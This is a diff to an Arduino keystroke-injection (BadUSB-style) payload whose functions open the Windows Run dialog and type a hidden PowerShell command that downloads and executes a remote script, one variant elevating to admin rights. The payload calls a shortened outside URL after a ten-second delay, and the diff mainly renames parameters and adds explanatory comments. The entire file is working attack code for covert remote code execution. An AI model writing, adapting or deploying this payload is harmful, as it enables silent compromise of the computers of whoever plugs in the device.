@@ -1,13 +1,14 @@
 #include "exfil.h"
 #include "phukd.h"
 
-void runRemote(char *IP){
+void runRemote(char *URL){
+  // downloads and runs a powershell script from a url
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   delay(100);
   Keyboard.releaseAll();
   delay(200);
-  Keyboard.print(F((String("powershell -w h -ep ByPass \"IEX(iwr('")+IP+"'))\"").c_str()));
+  Keyboard.print(F((String("powershell -w h \"IEX(iwr('")+URL+"'))\"").c_str()));
   delay(100);
   Keyboard.press(KEY_RETURN);
   delay(100);
@@ -18,13 +19,15 @@ void runRemote(char *IP){
   Keyboard.press(KEY_RETURN);
 };
 
-void runRemoteAdmin(char *IP){
+void runRemoteAdmin(char *URL){
+  // same as runRemote, but with admin privileges
+  // note: this only works if user logged-in is admin and admin prompts don't require a password
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   delay(100);
   Keyboard.releaseAll();
   delay(200);
-  Keyboard.print(F((String("powershell -w h -ep ByPass \"IEX(iwr('")+IP+"'))\"").c_str()));
+  Keyboard.print(F((String("powershell -w h \"IEX(iwr('")+URL+"'))\"").c_str()));
   delay(100);
   Keyboard.press(129); // ctrl
   Keyboard.press(129); // shift
@@ -46,6 +49,6 @@ void runRemoteAdmin(char *IP){
 };
 
 void payload() {
-  delay(10000);
+  delay(10000); // 10 sec. delay
   runRemote("is.gd/tuioh");
 }
